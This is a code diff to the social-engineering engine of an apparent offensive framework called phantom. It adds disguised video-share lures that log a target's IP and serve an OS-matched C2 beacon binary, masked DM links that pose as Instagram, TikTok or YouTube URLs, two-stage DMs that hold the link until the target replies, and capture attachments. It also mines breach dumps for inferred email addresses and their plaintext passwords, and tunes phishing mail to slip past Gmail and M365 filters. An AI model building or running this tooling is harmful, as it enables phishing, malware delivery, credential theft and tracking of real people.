@@ -193,8 +193,28 @@ class SocialEngine:
         # allows domain-based lures; speed disables the human-wait sleep
         self._aggressive = False
         self._speed = False
-        # follow-request ledger (private profiles): handle -> state
+        # identity-confidence tier per handle (from IDENTITY_CONF markers):
+        # a cross-platform handle that is NOT confirmed never receives a
+        # DM/follow unless --aggressive (the wrong-person guardrail at the
+        # CONTACT chokepoint, not just at the ledger pivot).
+        self._identity_tiers: Dict[str, str] = {}
+        # follow-request ledger (private profiles): handle -> state.
+        # BACKED BY DISK: multi-day warmups and follow waits survive a
+        # phantom restart (data/social_state.json, wall-clock re-checked).
+        self._state = None
+        try:
+            from phantom.automation.social.persona_state import shared_state
+            self._state = shared_state()   # loads + wall-clock re-evaluates
+        except Exception:
+            self._state = None
         self._follow_requests: Dict[str, Dict[str, Any]] = {}
+        if self._state is not None:
+            try:
+                for h in (self._state.pending_follows()
+                          + self._state.accepted_follows()):
+                    self._follow_requests[h] = self._state.follow_status(h)
+            except Exception:
+                pass
         self._video_cache: Optional[Dict[str, str]] = None
 
     def set_social_config(self, aggressive: bool = False,
@@ -221,6 +241,88 @@ class SocialEngine:
             from phantom.automation.social.grabbit import IpGrabber
             self._grabber = IpGrabber()
         return self._grabber
+
+    def _c2_payload_urls(self) -> Dict[str, str]:
+        """Per-OS beacon URLs when the C2 listener is live, else {}.
+
+        The tracker serves the binary matching the VISITOR's User-Agent,
+        so the lure works whatever the target OS is without knowing it in
+        advance (Windows PE / Linux ELF / macOS / Android APK)."""
+        try:
+            from phantom.core.c2_server import server_instance
+            if not (server_instance.thread and server_instance.thread.is_alive()):
+                return {}
+            from phantom.modules.craft import _payload_urls
+            from phantom.utils.network import get_c2_endpoint
+            host, port = get_c2_endpoint()
+            # a payload URL pointing at the VICTIM's own loopback is dead:
+            # the browser would fetch from itself. Never hand it to a lure —
+            # degrade to the pure IP-grab reel instead (set c2.host to the
+            # public address / domain for the beacon to be deliverable).
+            if str(host).strip() in ("", "127.0.0.1", "localhost",
+                                     "0.0.0.0", "::1"):
+                return {}
+            return _payload_urls(host, port)
+        except Exception:
+            return {}
+
+    def _lure_display_text(self, code: str = "") -> str:
+        """The VISIBLE text of a masked DM link: a plausible platform share
+        URL (instagram.com/reel/<id>, tiktok.com/@user/video/<id>,
+        youtu.be/<id>) shown where the channel renders link text instead
+        of the raw URL. The target reads a share link, the destination
+        stays the tracker."""
+        plat = (self._lure_platform() or "instagram").lower()
+        vid = ""
+        try:
+            v = self._pick_lure_video() or {}
+            vid = str(v.get("id") or "")
+        except Exception:
+            vid = ""
+        ident = vid or (code or "x")[-11:]
+        if plat == "tiktok":
+            h = (self._discovered_handle() or "user").lstrip("@")
+            return f"tiktok.com/@{h}/video/{ident}"
+        if plat == "youtube":
+            return f"youtu.be/{ident}"
+        return f"instagram.com/reel/{ident}"
+
+    def _video_lure_link(self, video, label: str = "dm"):
+        """The 2-in-1 social lure: a share-format reel/shorts URL whose
+        page load CAPTURES THE IP and whose play click ALSO downloads the
+        OS-matched beacon.
+
+        Degrades to a pure IP-grab reel when the C2 is not running: the
+        IP is the floor value of the lure (it converts the identity into
+        a machine target), the beacon is the bonus on top.
+        """
+        grabber = self._get_grabber()
+        platform = self._lure_platform()
+        payloads = self._c2_payload_urls()
+        if payloads:
+            link = grabber.create_player_link(
+                label=label, platform=platform,
+                handle=self._discovered_handle(), video=video,
+                payload_urls=payloads)
+        else:
+            link = grabber.create_video_share_link(
+                label=label, platform=platform,
+                handle=self._discovered_handle(), video=video)
+        # FINAL HOP: point this code at the REAL video page so a plain
+        # click lands on the genuine platform after the IP is captured
+        # ("I opened the shared video and it played").
+        watch = ""
+        try:
+            from phantom.modules.craft import _watch_url
+            watch = _watch_url(video or {})
+            if watch:
+                server = grabber._server or grabber._default_server
+                if server is None:
+                    server = grabber._ensure_default_server()
+                server.register_redirect(link.code, watch)
+        except Exception:
+            pass
+        return link
 
     def _get_mailer(self):
         if self._mailer is None:
@@ -287,8 +389,53 @@ class SocialEngine:
         except Exception:
             return [f"IDENTITY: phone={phone} carrier= region="]
 
+    def _email_variants(self) -> List[str]:
+        """Candidate emails inferred from the dossier's identity data:
+        the name/company pattern a person almost certainly registered
+        with (mario.rossi@, mrossi@, mario+ig@...). Breach dumps are the
+        verification: a variant that appears in a dump IS the person's
+        registration address even when no platform ever showed it."""
+        variants: List[str] = []
+        name = str(self._discovered.get("name") or "").strip()
+        emails = [e for e in (self._discovered.get("emails") or []) if "@" in e]
+        # derive first/last + domain from whatever OSINT already holds
+        first, last = "", ""
+        if name and " " in name:
+            first, last = (p.lower() for p in name.split()[:2])
+        elif emails:
+            local = emails[0].split("@")[0]
+            parts = [p for p in local.replace(".", " ").replace("_", " ")
+                     .replace("-", " ").split() if len(p) >= 2]
+            if len(parts) >= 2:
+                first, last = parts[0], parts[1]
+        domain = emails[0].split("@", 1)[1] if emails else ""
+        platform_dom = str(self._discovered.get("platform") or "")
+        if first and last:
+            locals_ = (f"{first}.{last}", f"{first}{last}",
+                       f"{first[0]}{last}", f"{first}_{last}",
+                       f"{first}")
+            doms = [d for d in (domain,) if d]
+            if platform_dom:
+                doms.append(platform_dom + ".com")
+            for l in locals_:
+                for d in doms:
+                    variants.append(f"{l}@{d}")
+                    break                      # one domain per local part
+        elif emails:
+            # plus-tag variant of a KNOWN address: mario@x.com -> mario+ig@x.com
+            e = emails[0]
+            local, dom = e.split("@", 1)
+            tag = platform_dom or "social"
+            variants.append(f"{local}+{tag}@{dom}")
+        known = {e.lower() for e in emails}
+        return [v for v in dict.fromkeys(variants)
+                if v.lower() not in known][:6]
+
     def breach(self, target: str, target_type: str) -> Tuple[bool, List[str]]:
-        """Breach-dump lookup for an email/username.
+        """Breach-dump lookup for an email/username — PLUS inferred email
+        variants: when OSINT gave us a name/company, the standard
+        registration patterns are checked through the same breach API, so
+        the account's email surfaces even when no bio ever showed it.
 
         Sources (in order):
           1. PHANTOM_BREACH_API — a self-hosted/aggregator JSON API exposing
@@ -297,8 +444,10 @@ class SocialEngine:
              Returns exposure facts (which breaches) but never passwords.
         """
         lines: List[str] = []
-        api = os.getenv("PHANTOM_BREACH_API", "")
-        hibp_key = os.getenv("PHANTOM_HIBP_API_KEY", "")
+        from phantom.utils import config as cfg
+        api = str(cfg.get("breach.custom_api", "", env="PHANTOM_BREACH_API"))
+        hibp_key = str(cfg.get("breach.hibp_api_key", "",
+                               env="PHANTOM_HIBP_API_KEY"))
         if not api and not hibp_key:
             return True, [_marker_error(
                 "no breach source configured: set PHANTOM_BREACH_API or PHANTOM_HIBP_API_KEY")]
@@ -307,24 +456,35 @@ class SocialEngine:
             # the channel the breach was found on matters: the same breach
             # name on email AND phone is the strongest strategic hook
             ch = "phone" if target_type == "phone" else "email"
+            # the PRIMARY lookup, then the INFERRED registration patterns:
+            # a variant that surfaces in a dump is the account's real email
+            # even when no platform ever displayed it
+            queries = [target] + self._email_variants()
             try:
                 from phantom.core.executor import execute_quiet
-                res = execute_quiet(
-                    f"curl -s -m 20 -H 'Accept: application/json' "
-                    f"'{api}/lookup?q={target}'", timeout=30)
-                out = (res.stdout or "").strip()
-                if out.startswith("{"):
+                for q in queries:
+                    res = execute_quiet(
+                        f"curl -s -m 20 -H 'Accept: application/json' "
+                        f"'{api}/lookup?q={q}'", timeout=30)
+                    out = (res.stdout or "").strip()
+                    if not out.startswith("{"):
+                        continue
                     import json
                     data = json.loads(out)
                     for entry in data.get("results", []):
-                        email = entry.get("email", target)
+                        email = entry.get("email", q)
                         self._remember("emails", email)
                         pw = entry.get("password", "")
                         self._remember_breach(entry.get("source", "breach"), ch)
                         if pw:
+                            note = " (inferred variant)" if q != target else ""
                             lines.append(
                                 f"BREACH: email={email} "
                                 f"password={pw} source={entry.get('source', 'breach')}")
+                            if note:
+                                lines.append(
+                                    f"IDENTITY: email={email} "
+                                    f"source=breach_pattern_match")
             except Exception as e:
                 lines.append(_marker_error(f"breach API failed: {e}"))
 
@@ -384,6 +544,16 @@ class SocialEngine:
                                        audience=audience or self._infer_audience())
             profile.avatar_path = generate_avatar(profile)
             self._profile = profile
+            # the persona clock starts at FIRST creation and is never reset
+            # by a re-run (idempotent) — warmup is what keeps the account
+            # alive past day zero
+            if self._state is not None:
+                try:
+                    self._state.persona_created(
+                        profile.name, name=profile.name,
+                        aggressive=self._aggressive)
+                except Exception:
+                    pass
             # marker values are single tokens: spaces become underscores
             def _tok(v: str) -> str:
                 return (v or "").replace(" ", "_")
@@ -484,6 +654,82 @@ class SocialEngine:
             return (True, lines) if lines else (True, [])
         except Exception as e:
             return False, [f"ERROR: profile recon failed: {e}"]
+
+    def deep_recon(self, username: str, platform: str = "") -> Tuple[bool, List[str]]:
+        """DEEP reverse-engineering pass (the reliable upgrade to
+        profile_recon): multi-marker private-state voting across two
+        fetches, tagged/commenter/follower mining from embedded JSON,
+        username-variant probing, Wayback snapshots of ex-public profiles,
+        search dorks, avatar-hash and bio-similarity cross-account
+        correlation. Emits RECON_STATE/ACCOUNT_LINK/COMMENTER/TAGGED_IN
+        markers the social interpreter turns into findings."""
+        try:
+            from phantom.automation.social.recon import deep_recon as _deep
+            platform = (platform or self._discovered.get("platform")
+                        or "instagram").lower()
+            ok, lines = _deep(username, platform)
+            if ok:
+                self._remember("platform", platform)
+                # parse back our own markers to update the discovered map
+                for line in lines:
+                    if line.startswith("RECON_STATE:"):
+                        kv = dict(
+                            c.split("=", 1) for c in
+                            line[len("RECON_STATE:"):].split() if "=" in c)
+                        if kv.get("state"):
+                            prof = self._discovered.setdefault("profile", {})
+                            prof["username"] = username
+                            prof["platform"] = platform
+                            prof["private"] = kv.get("state") == "private"
+                            if kv.get("followers"):
+                                prof["followers"] = kv["followers"]
+                            if kv.get("fullname"):
+                                prof["full_name"] = kv["fullname"].replace("_", " ")
+                    elif line.startswith("ACCOUNT_LINK:"):
+                        kv = dict(
+                            c.split("=", 1) for c in
+                            line[len("ACCOUNT_LINK:"):].split() if "=" in c)
+                        if kv.get("handle"):
+                            self._remember("handles", kv["handle"])
+                    elif line.startswith("IDENTITY:"):
+                        kv = dict(
+                            c.split("=", 1) for c in
+                            line[len("IDENTITY:"):].split() if "=" in c)
+                        if kv.get("email"):
+                            self._remember("emails", kv["email"])
+                    elif line.startswith("IDENTITY_CONF:"):
+                        kv = dict(
+                            c.split("=", 1) for c in
+                            line[len("IDENTITY_CONF:"):].split()
+                            if "=" in c)
+                        h = (kv.get("handle") or "").strip().lstrip("@").lower()
+                        if h and kv.get("tier"):
+                            self._identity_tiers[h] = kv["tier"]
+            return ok, lines
+        except Exception as e:
+            return False, [f"ERROR: deep recon failed: {e}"]
+
+    def surface_map(self, domain: str = "") -> Tuple[bool, List[str]]:
+        """Hardened-target attack-surface pass (CT logs, Wayback, JS,
+        mail/SPF/DMARC, SSO/OIDC, VPN fingerprints, DNS misconfigs).
+        Used when the perimeter is blind to port scans — asset
+        enumeration is the senior move against CDN/WAF frontends."""
+        try:
+            from phantom.automation.surface import map_surface
+            domain = (domain or self._discovered.get("domain")
+                      or self._discovered.get("link_domain") or "").strip()
+            if not domain:
+                # derive from the target when it IS a domain/url
+                t = (self._discovered.get("target") or "").strip()
+                t = t.split("/")[0].split(":")[0]
+                if "." in t and "@" not in t:
+                    domain = t
+            if not domain:
+                return False, [_marker_error(
+                    "surface_map needs a domain target (or a discovered domain)")]
+            return map_surface(domain)
+        except Exception as e:
+            return False, [f"ERROR: surface mapping failed: {e}"]
 
     def _profile_candidates(self, platform: str, username: str) -> List[tuple]:
         """Ordered list of (platform, url) to try. Known platform first, then
@@ -610,6 +856,20 @@ class SocialEngine:
             mailer = self._get_mailer()
             rendered = self._render_for(recipient, pretext, subject, body, link,
                                         pixel=True, strategic=strategic)
+            # pre-send anti-blocking preflight: the email hop fails SILENTLY,
+            # so score it against the vectors Gmail/M365 actually filter on
+            # before relaying it (report only - never blocks a send).
+            from phantom.automation.social.deliverability import (
+                deliverability_report)
+            rep = deliverability_report(
+                subject=rendered["subject"], body_text=rendered["body_text"],
+                html=rendered["body_html"], link=link.short_url,
+                sender=rendered["from"], tracking_pixel=self._pixel_url(link))
+            lines.append(rep.marker())
+            if rep.blocking:
+                lines.append(
+                    f"WARNING: message likely DROPPED by the mail filter "
+                    f"({rep.grade}, {rep.score}/100) - {rep.top_fix()}")
             ok = mailer.send_email(
                 rendered["from"], recipient, rendered["subject"],
                 rendered["body_text"], html=rendered["body_html"],
@@ -654,8 +914,21 @@ class SocialEngine:
                 f"unknown pretext '{pretext}': use one of {','.join(pretext_ids())}")]
         camp = Campaign(id=uuid.uuid4().hex[:8], pretext=pretext)
         lines: List[str] = []
+        # persona warmup gate (same discipline as DMs): email is still a
+        # cold CONTACT from a fresh identity — persisted clock decides.
+        warm_ok, warm_note = self.warmup_gate()
+        if not warm_ok:
+            return False, [_marker_error(
+                f"persona_warmup: {warm_note} (use --aggressive to override)")]
         grabber = self._get_grabber()
         mailer = self._get_mailer()
+        # anti-burst: human-paced randomized send spacing so a multi-target
+        # campaign never presents the identical-moment bulk signature
+        if hasattr(mailer, "set_jitter"):
+            try:
+                mailer.set_jitter(len(targets) > 1)
+            except Exception:
+                pass
 
         for t in targets:
             t = (t or "").strip()
@@ -682,6 +955,21 @@ class SocialEngine:
                     ct.link, ct.code = link.short_url, link.code
                     rendered = self._render_for(t, pretext, subject, body, link,
                                                 pixel=True, strategic=strategic)
+                    # pre-send anti-blocking preflight (per target: a campaign
+                    # is bulk mail, which is filtered harder)
+                    from phantom.automation.social.deliverability import (
+                        deliverability_report)
+                    rep = deliverability_report(
+                        subject=rendered["subject"],
+                        body_text=rendered["body_text"],
+                        html=rendered["body_html"], link=link.short_url,
+                        sender=rendered["from"],
+                        tracking_pixel=self._pixel_url(link), is_bulk=True)
+                    lines.append(rep.marker())
+                    if rep.blocking:
+                        lines.append(
+                            f"WARNING: {t} likely DROPPED by the mail filter "
+                            f"({rep.grade}, {rep.score}/100) - {rep.top_fix()}")
                     ok = mailer.send_email(
                         rendered["from"], t, rendered["subject"],
                         rendered["body_text"], html=rendered["body_html"],
@@ -777,18 +1065,35 @@ class SocialEngine:
             pretext: Optional[str] = None,
             platform: str = "auto",
             use_login_page: bool = True,
-            use_video: bool = False) -> Tuple[bool, List[str]]:
-        """Send short direct messages (Telegram/Discord/console) with a
-        per-target tracking link.
+            use_video: bool = False,
+            mode: str = "auto") -> Tuple[bool, List[str]]:
+        """Deliver the social contact — STRATEGY DECIDED BY THE CHANNEL.
 
-        A DM click still lands on the grabbit tracker, so the identity
-        chain converges on a victim_ip exactly like the email path.
-        Requires PHANTOM_TELEGRAM_BOT_TOKEN or PHANTOM_DISCORD_WEBHOOK;
-        degrades to a clear ERROR marker when neither is configured.
+        * attachment  (Telegram / console: a channel that carries files):
+          the capture ARTEFACT goes in the chat, no URL anywhere;
+        * two_stage   (Instagram/TikTok/X, or a channel whose transport
+          cannot attach): the innocuous opener earns a reply and the link
+          is HELD for `dm_second_stage()`;
+        * link        (forced with mode="link", or a flagged pretext): the
+          single-message behaviour, masked where the client renders link
+          text.
+
+        `plan_delivery()` decides and the `DM_PLAN` marker records why. A DM
+        click still lands on the grabbit tracker, so the identity chain
+        converges on a victim_ip exactly like the email path. Requires
+        PHANTOM_TELEGRAM_BOT_TOKEN or PHANTOM_DISCORD_WEBHOOK; degrades to a
+        clear ERROR marker when neither is configured.
         """
         from phantom.automation.social.social_dm import (
-            dm_pretext_ids, get_dm_transport, launch_dm)
-        pretext = pretext or "security_verify"
+            dm_pretext_ids, dm_plan_marker, dm_pretext_category,
+            get_dm_transport, launch_dm, launch_dm_file,
+            plan_delivery, recommended_dm_pretext, render_dm_message)
+        from phantom.automation.social.attachment import (
+            build_capture_attachment, default_filename)
+        # the DEFAULT opener is innocuous, not "verify your account": the
+        # flagged angles are the ones people have learned not to click. The
+        # operator can still force any pretext explicitly.
+        pretext = pretext or recommended_dm_pretext()
         if not targets:
             return False, ["ERROR: dm requires at least one target"]
         if pretext not in dm_pretext_ids():
@@ -800,32 +1105,261 @@ class SocialEngine:
             return False, ["ERROR: no_dm_transport_configured: "
                            "set PHANTOM_TELEGRAM_BOT_TOKEN or "
                            "PHANTOM_DISCORD_WEBHOOK"]
+        # persona warmup gate: a day-zero cold DM is the #1 account-ban
+        # signal. Gated on the PERSISTED clock (survives restarts) unless
+        # --aggressive explicitly accepted the risk or speed chose not to
+        # block (warmup still reported).
+        warm_ok, warm_note = self.warmup_gate()
+        if not warm_ok:
+            return False, [f"ERROR: persona_warmup: {warm_note} "
+                           "(use --aggressive to override)"]
         grabber = self._get_grabber()
         lines: List[str] = []
         for t in targets:
             t = (t or "").strip()
             if not t:
                 continue
+            if not self._contact_allowed(t):
+                lines.append(
+                    f"DM_SENT: to={t} delivered=0 "
+                    f"note=identity_unconfirmed_skipped "
+                    f"(tier={self._identity_tiers.get(t.lower(), 'unrelated')} "
+                    "— requires CONFIRMED evidence or --aggressive)")
+                continue
+            # ---------------- DELIVERY STRATEGY (channel-decided) --------
+            # The CHANNEL decides, not a global default. plan_delivery()
+            # carries the reason, and the plan is logged so the reasoning
+            # log SHOWS the decision instead of asserting it.
+            plan = plan_delivery(transport.platform, strategy=mode)
+            if (plan["strategy"] == "attachment"
+                    and not getattr(transport, "supports_files", False)):
+                # the platform allows a document but THIS transport cannot
+                # send one (Discord/WhatsApp today): degrade to two-stage and
+                # keep the missing piece named in `needs`
+                plan["strategy"] = "two_stage"
+                plan["degraded_from"] = "attachment"
+                plan["carries_file"] = False
+            lines.append(dm_plan_marker(plan, t))
+            staged = dm_pretext_category(pretext) == "innocuous"
+            opener = render_dm_message(
+                pretext, {"name": self._discovered_name(t),
+                          "platform": self._discovered.get("platform")
+                          or "online"}, stage=1)
+            if plan["strategy"] == "attachment" and plan["carries_file"]:
+                # THE ATTACHMENT PATH: the capture artefact goes in the chat.
+                # There is no URL anywhere, so there is nothing the target can
+                # read and call fake; the capture fires when they OPEN it.
+                path = ""
+                try:
+                    art = grabber.create_link(label="dm")
+                    path = build_capture_attachment(
+                        art.code, self._pixel_url(art),
+                        kind=plan.get("attachment_kind") or "html")
+                except Exception as e:
+                    lines.append("DM_PLAN: platform=%s strategy=attachment "
+                                 "error=%s" % (transport.platform,
+                                               str(e)[:60].replace(" ", "_")))
+                if path:
+                    self._remember_opener(t, transport.platform, pretext,
+                                          "attachment")
+                    # launch_dm_file, not launch_dm_attachment: the plan line
+                    # is already out (with the per-transport degradation), and
+                    # a second one computed from the platform alone could
+                    # disagree with it
+                    ok, out = launch_dm_file(
+                        [t], path, caption=opener or "",
+                        filename=default_filename(
+                            plan.get("attachment_kind") or "html"),
+                        transport=transport)
+                    lines.extend(out)
+                    lines.append(f"DM_ATTACH: to={t} "
+                                 f"platform={transport.platform} "
+                                 "strategy=attachment note=no_link")
+                continue
+            if plan["strategy"] == "two_stage" and staged:
+                # TWO-STAGE: the opener earns a REPLY; the link rides the
+                # second message, sent by dm_second_stage() once it arrives.
+                # Holding the link is the point — a link in a cold first
+                # message is exactly what this strategy exists to avoid.
+                self._remember_opener(t, transport.platform, pretext,
+                                      "two_stage")
+                ok, out = launch_dm(
+                    [t], pretext, link="", transport=transport,
+                    context={"name": self._discovered_name(t),
+                             "platform": self._discovered.get("platform")
+                             or "online"})
+                lines.extend(out)
+                lines.append(f"DM_STAGE: to={t} stage=1 of=2 "
+                             "note=awaiting_reply link=held")
+                continue
             if use_video:
+                # 2-in-1: reel skin + IP grab on load + beacon on the play
+                # click (OS-matched). IP alone when the C2 is down.
                 video = self._pick_lure_video()
-                link = grabber.create_video_share_link(
-                    label="dm", platform=self._lure_platform(),
-                    handle=self._discovered_handle(), video=video)
+                link = self._video_lure_link(video, label="dm")
             elif use_login_page:
                 link = grabber.create_login_link(label="dm")
             else:
                 link = grabber.create_link(label="dm")
             ctx = {"name": self._discovered_name(t),
                    "platform": self._discovered.get("platform") or "online"}
-            ok, out = launch_dm([t], pretext, link=str(link.short_url),
-                                transport=transport, context=ctx)
+            # masked link: where the channel renders link text (Telegram/
+            # Discord) the target reads a plausible share URL while the
+            # destination stays the tracker; elsewhere the raw URL shows.
+            ok, out = launch_dm(
+                [t], pretext, link=str(link.short_url),
+                transport=transport, context=ctx,
+                display=self._lure_display_text(link.code))
             lines.extend(out)
         return (True, lines) if lines else (False, ["ERROR: no targets processed"])
+
+    def _contact_allowed(self, handle: str) -> bool:
+        """The wrong-person guardrail at the CONTACT chokepoint.
+
+        A handle the OSINT pass scored CONFIRMED (avatar/cross-link/email
+        proof) is always contactable. A PROBABLE/UNRELATED cross-platform
+        candidate never receives a DM/follow unless --aggressive — the
+        operator explicitly accepted the risk. Handles with NO tier (the
+        primary target, operator-supplied handles) are unaffected.
+        """
+        h = (handle or "").strip().lstrip("@").lower()
+        tier = self._identity_tiers.get(h)
+        if not tier:
+            return True
+        if tier == "confirmed":
+            return True
+        return bool(self._aggressive)
 
     def dm_delivered(self, lines: List[str]) -> bool:
         """True when at least one DM_SENT marker reports delivered=1."""
         from phantom.automation.social.social_dm import dm_delivery_report
         return dm_delivery_report(lines).get("delivered", 0) > 0
+
+    def _remember_opener(self, handle: str, platform: str, pretext: str,
+                         strategy: str) -> None:
+        """Persist stage 1 so a LATER SESSION can send the link.
+
+        Best-effort: a state file that cannot be written must never abort
+        the contact that is already going out.
+        """
+        if self._state is None:
+            return
+        try:
+            self._state.conversation_start(handle, platform=platform,
+                                           pretext=pretext,
+                                           strategy=strategy)
+        except Exception:
+            pass
+
+    def _ip_only_lure_link(self, label: str = "dm"):
+        """The SOCIAL lure: a share-format reel URL whose page load
+        CAPTURES THE IP and which offers NO beacon.
+
+        Operator decision: social carries the capture, the beacon belongs to
+        the exploit chain (scan -> exploit -> beacon). The embedded video is
+        real and the click lands on the genuine watch page after the
+        capture, so the target's expectation is met either way.
+        """
+        grabber = self._get_grabber()
+        video = self._pick_lure_video()
+        link = grabber.create_video_share_link(
+            label=label, platform=self._lure_platform(),
+            handle=self._discovered_handle(), video=video)
+        try:
+            from phantom.modules.craft import _watch_url
+            watch = _watch_url(video or {})
+            if watch:
+                server = grabber._server or grabber._default_server
+                if server is None:
+                    server = grabber._ensure_default_server()
+                server.register_redirect(link.code, watch)
+        except Exception:
+            pass
+        return link
+
+    def dm_second_stage(self, handles: Optional[List[str]] = None,
+                        pretext: str = "", platform: str = "auto",
+                        aggressive: Optional[bool] = None
+                        ) -> Tuple[bool, List[str]]:
+        """Send the HELD LINK to the handles whose opener already landed.
+
+        This is stage 2, and it is the part that survives RESTARTS: the
+        opener went out yesterday (persisted), the target replied today, and
+        THIS call — possibly from a brand-new process — sends the link.
+        Without it a multi-day engagement stalls waiting for a process that
+        no longer exists.
+
+        The gate is the target's REPLY, not a timer: a link sent before the
+        reply is a cold link again. `aggressive` (--aggressive) is the
+        operator explicitly accepting that cold re-contact.
+        """
+        from phantom.automation.social.social_dm import (
+            dm_pretext_ids, get_dm_transport, launch_dm,
+            recommended_dm_pretext)
+        if self._state is not None:
+            try:
+                self._state.reload()   # wall-clock re-evaluation on resume
+            except Exception:
+                pass
+        transport = get_dm_transport(platform)
+        if transport is None:
+            return False, ["ERROR: no_dm_transport_configured: "
+                           "set PHANTOM_TELEGRAM_BOT_TOKEN or "
+                           "PHANTOM_DISCORD_WEBHOOK"]
+        if aggressive is None:
+            aggressive = bool(self._aggressive)
+        owed = [h for h in (handles or []) if (h or "").strip()]
+        if not owed and self._state is not None:
+            owed = self._state.awaiting_stage2(aggressive=aggressive)
+        if not owed:
+            return False, ["ERROR: no_stage2_pending: no opener is waiting "
+                           "for its link"]
+        grabber = self._get_grabber()
+        lines: List[str] = []
+        sent_any = False
+        for h in owed:
+            h = (h or "").strip()
+            if not h:
+                continue
+            if not self._contact_allowed(h):
+                lines.append(f"DM_STAGE: to={h} stage=2 delivered=0 "
+                             "note=identity_unconfirmed_skipped")
+                continue
+            if self._state is not None and not self._state.stage2_ready(
+                    h, aggressive=aggressive):
+                st = self._state.conversation_status(h)
+                note = ("already_sent" if st.get("stage2_at")
+                        else "awaiting_reply")
+                lines.append(f"DM_STAGE: to={h} stage=2 delivered=0 "
+                             f"note={note}")
+                continue
+            st = (self._state.conversation_status(h) if self._state else {})
+            p = pretext or st.get("pretext") or recommended_dm_pretext()
+            if p not in dm_pretext_ids():
+                p = recommended_dm_pretext()
+            link = self._ip_only_lure_link(label="dm2")
+            ctx = {"name": self._discovered_name(h),
+                   "platform": self._discovered.get("platform") or "online"}
+            ok, out = launch_dm(
+                [h], p, link=str(link.short_url), transport=transport,
+                context=ctx, stage=2,
+                display=self._lure_display_text(link.code))
+            lines.extend(out)
+            if ok and self._state is not None:
+                try:
+                    self._state.stage2_sent(h)
+                except Exception:
+                    pass
+            lines.append(f"DM_STAGE: to={h} stage=2 delivered="
+                         f"{1 if ok else 0}")
+            if ok:
+                sent_any = True
+        if sent_any:
+            return True, lines
+        # nothing went out (no reply yet, already sent, or the transport
+        # refused): report the reason instead of a fake success
+        return False, lines + ["ERROR: no_stage2_link_sent: see the "
+                               "DM_STAGE notes above"]
 
     def dm_follow(self, handles: List[str],
                   platform: str = "") -> Tuple[bool, List[str]]:
@@ -846,6 +1380,11 @@ class SocialEngine:
             h = (h or "").strip().lstrip("@")
             if not h:
                 continue
+            if not self._contact_allowed(h):
+                lines.append(
+                    f"FOLLOW_SENT: handle={h} platform={platform} "
+                    f"delivered=0 note=identity_unconfirmed_skipped")
+                continue
             delivered, note = 0, "ok"
             if transport is not None and hasattr(transport, "send_follow"):
                 try:
@@ -859,13 +1398,28 @@ class SocialEngine:
             self._follow_requests[h] = {"platform": platform,
                                         "sent_at": _now(),
                                         "accepted": False}
+            if self._state is not None:
+                try:
+                    self._state.follow_sent(h, platform)  # survives restarts
+                except Exception:
+                    pass
             lines.append(f"FOLLOW_SENT: handle={h} platform={platform} "
                          f"delivered={delivered} note={note}")
         return (True, lines) if lines else (False, ["ERROR: no_follow_targets"])
 
     def accept_follow(self, handle: str) -> bool:
         """Mark a follow request as accepted (operator confirm / test / an
-        OAuth-backed transport detecting the accept)."""
+        OAuth-backed transport detecting the accept). Persisted: a follow
+        accepted yesterday is STILL accepted in the next session."""
+        if self._state is not None:
+            try:
+                ok = self._state.follow_accepted(handle)
+                if ok:
+                    self._follow_requests[handle] = (
+                        self._state.follow_status(handle))
+                return ok
+            except Exception:
+                pass
         req = self._follow_requests.get(handle)
         if req is None:
             return False
@@ -875,10 +1429,21 @@ class SocialEngine:
     def wait_follow(self, timeout: float = 300.0) -> Tuple[bool, List[str]]:
         """Block (chunked) until every pending follow request is accepted.
         Returns FOLLOW_ACCEPTED markers for the ones accepted; no markers
-        when the horizon is exhausted (the agent escalates, never hangs)."""
+        when the horizon is exhausted (the agent escalates, never hangs).
+
+        Wall-clock aware: the ledger is RELOADED from disk during the wait,
+        so an accept recorded by another session/operator lands here too."""
         deadline = time.time() + timeout
         lines: List[str] = []
         while time.time() < deadline:
+            if self._state is not None:
+                try:
+                    self._state.reload()
+                    for h in self._state.accepted_follows():
+                        self._follow_requests.setdefault(
+                            h, self._state.follow_status(h))
+                except Exception:
+                    pass
             pending = [h for h, r in self._follow_requests.items()
                        if not r.get("accepted")]
             if not pending:
@@ -889,6 +1454,23 @@ class SocialEngine:
                 lines.append(f"FOLLOW_ACCEPTED: handle={h} "
                              f"platform={r.get('platform', '')}")
         return (bool(lines), lines)
+
+    def warmup_gate(self, persona_id: str = "") -> Tuple[bool, str]:
+        """The pre-contact gate: is the ACTIVE persona old enough for a
+        cold DM/email? Returns (ok, human_reason). Aggressive runs pass
+        explicitly (the operator accepted the burn risk); speed runs
+        report but never block. Uses the PERSISTED clock — a persona
+        created 3 days ago is ready even if phantom restarted since."""
+        pid = (persona_id or (self._profile.name if self._profile else ""))
+        if not pid or self._state is None:
+            return True, "no persona clock (state unavailable)"
+        try:
+            if self._speed and not self._aggressive:
+                return True, self._state.warmup_note(pid) + " (speed: not blocking)"
+            ok = self._state.warmup_ok(pid, aggressive=self._aggressive)
+            return ok, self._state.warmup_note(pid)
+        except Exception as e:
+            return True, f"warmup check skipped ({e})"
 
     def _discovered_name(self, target: str) -> str:
         """Best-effort display name for a DM handle from OSINT memory."""
@@ -966,10 +1548,12 @@ class SocialEngine:
         from phantom.automation.social.spoof import apply, derive_sender
         build_dossier, _, _ = _load_dossier()
         dossier = build_dossier(self._discovered).to_dict()
+        from phantom.utils import config as cfg
         display, addr = derive_sender(
             dossier, pretext or "",
             persona_email=self._reply_to() or "",
-            configured=os.getenv("PHANTOM_PHISH_FROM", "").strip())
+            configured=str(cfg.get("transports.phish_from", "",
+                                   env="PHANTOM_PHISH_FROM")).strip())
         if pretext == "recruiter" and self._profile is not None:
             display = self._profile.name
         if self._homoglyph_enabled():
@@ -1089,7 +1673,9 @@ class SocialEngine:
     def _get_advisor(self):
         """Lazy LLM advisor — active only when PHANTOM_LLM_MODEL is set.
         Injectable for tests (assign `eng._advisor`)."""
-        if self._advisor is None and os.getenv("PHANTOM_LLM_MODEL", "").strip():
+        from phantom.utils import config as cfg
+        model = str(cfg.get("llm.model_path", "", env="PHANTOM_LLM_MODEL"))
+        if self._advisor is None and model.strip():
             try:
                 from phantom.automation.llm_advisor import LLMAdvisor
                 self._advisor = LLMAdvisor(enabled=True)
@@ -1131,7 +1717,9 @@ class SocialEngine:
         """SMS phish: resolve the carrier (env override -> phonenumbers ->
         explicit error), then send through the email-to-SMS gateway."""
         from phantom.automation.social.persona import carrier_from_phone
-        carrier = (os.getenv("PHANTOM_SMS_CARRIER", "")
+        from phantom.utils import config as cfg
+        carrier = (str(cfg.get("transports.sms_carrier", "",
+                               env="PHANTOM_SMS_CARRIER"))
